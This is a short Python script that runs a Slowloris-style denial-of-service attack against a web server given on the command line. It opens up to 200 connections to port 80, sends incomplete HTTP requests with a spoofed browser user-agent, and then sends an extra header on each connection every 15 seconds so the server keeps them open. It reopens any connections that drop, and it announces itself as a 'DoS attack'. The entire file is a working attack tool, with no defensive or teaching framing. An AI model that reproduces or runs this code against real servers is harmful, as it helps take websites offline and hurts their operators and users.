import socket, random, time, sys

header_values = [
    "User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Accept-language: en-US,en"
]

socket_list = []

def initiate_socket(connection_ip):
    conn_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn_socket.settimeout(4)
    conn_socket.connect((connection_ip, 80))
    conn_socket.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

    for header in header_values:
        conn_socket.send("{}\r\n".format(header).encode("utf-8"))

    return conn_socket

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Use it like this: python {} example.com".format(sys.argv[0]))
        sys.exit()

    target_ip = sys.argv[1]
    connection_limit = 200
    print("Starting DoS attack on {}. Connecting to {} sockets.".format(target_ip, connection_limit))

    for _ in range(connection_limit):
        try:
            print("Socket {}".format(_))
            connection_socket = initiate_socket(target_ip)
        except socket.error:
            break

        socket_list.append(connection_socket)

    while True:
        print("Connected to {} sockets. Sending headers...".format(len(socket_list)))

        for socket_instance in list(socket_list):
            try:
                socket_instance.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                socket_list.remove(socket_instance)

        for _ in range(connection_limit - len(socket_list)):
            print("Re-opening closed sockets...")
            try:
                connection_socket = initiate_socket(target_ip)
                if connection_socket:
                    socket_list.append(connection_socket)
            except socket.error:
                break

        time.sleep(15)
